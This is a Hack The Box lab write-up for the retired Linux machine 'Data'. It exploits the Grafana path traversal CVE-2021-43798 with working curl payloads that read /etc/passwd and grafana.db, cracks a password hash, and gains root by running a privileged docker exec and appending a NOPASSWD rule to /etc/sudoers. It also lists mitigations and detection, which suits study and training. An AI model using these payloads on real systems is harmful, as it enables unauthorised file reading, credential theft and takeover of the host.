---
machine: Data
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, grafana, cve-2021-43798, path-traversal, docker, privesc]
---

# Data — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Grafana 8.0.0 is vulnerable to CVE-2021-43798, a path traversal in the plugin resolver. It reads `grafana.db`, cracks `boris`'s PBKDF2 hash and logs in over SSH. A `sudo` rule for `docker exec --privileged` mounts the host disk and writes to `/etc/sudoers`.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p22,3000 <IP>
```

- SSH on the host.
- Grafana 8.0.0 on port 3000.
- The TTL and service behaviour suggest a container separate from the host.

## Enumeration

- The domain is `data.htb`.
- Grafana's footer confirms version 8.0.0.
- The path `/public/plugins/<plugin>/../../../../` does not canonicalise `..` segments.

## Foothold

An installed plugin such as `alertlist` traverses the filesystem and reads `/etc/passwd` and Grafana's database.

```bash
curl -s "http://data.htb:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
curl -s "http://data.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

The database contains users and PBKDF2 hashes. `boris`'s hash is cracked with `hashcat -m 10000` and the password is reused over SSH.

```bash
sqlite3 grafana.db 'select login,password from user;'
hashcat -m 10000 boris.hash /usr/share/wordlists/rockyou.txt
ssh boris@data.htb
```

## Privilege escalation

`sudo -l` allows passwordless `docker exec` against an existing container. The container runs with `--privileged`, so it can mount the host disk.

```bash
sudo -l
docker ps
sudo /usr/bin/docker exec --privileged -u root -it <CONTAINER> bash
mount /dev/sda1 /mnt
echo 'boris ALL=(ALL) NOPASSWD: ALL' >> /mnt/etc/sudoers
```

After leaving the container, `sudo -i` grants root on the host.

## Evidence

- `/etc/passwd` and `grafana.db` read through traversal.
- Cracked hash and SSH access, with the password redacted.
- `sudo` rule and `/dev/sda1` mount.
- Redacted flag.

## Lessons learned

- Plugin path traversal reaches the whole filesystem, not just configuration files.
- A PBKDF2 hash is only as strong as the chosen password.
- `docker exec` with privileges is equivalent to root on the host.

## Mitigations and detection

- Update Grafana to 8.3.1 or later.
- Do not reuse application passwords for system accounts.
- Avoid `--privileged` and restrict which containers `sudo` may run.
- Audit device mounts and changes to `/etc/sudoers`.

## References

- <https://www.hackthebox.com/machines/Data>
- <https://nvd.nist.gov/vuln/detail/CVE-2021-43798>
- <https://grafana.com/security/security-advisories/cve-2021-43798/>
- <https://attack.mitre.org/techniques/T1611/>
